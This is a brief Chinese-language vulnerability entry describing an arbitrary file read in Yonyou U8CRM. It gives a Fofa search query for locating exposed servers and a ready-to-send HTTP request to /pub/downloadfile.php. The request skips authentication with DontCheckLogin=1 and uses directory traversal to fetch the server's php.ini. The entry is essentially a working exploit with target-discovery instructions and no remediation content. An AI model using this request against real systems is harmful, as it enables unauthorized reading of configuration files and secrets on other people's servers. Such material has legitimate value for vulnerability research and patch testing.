# K8-9用友U8CRM任意文件读取

<u></u>





### 漏洞描述：用友U8CRM任意文件读取



### Fofa语句：app=“用友U8CRM”



### 漏洞复现：

```
GET /pub/downloadfile.php?DontCheckLogin=1&url=/datacache/../../../apache/php.ini HTTP/1.1
Host: 127.0.0.1:8088
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh,zh-CN;q=0.9,en;q=0.8
Connection: close
Content-Length: 4
```

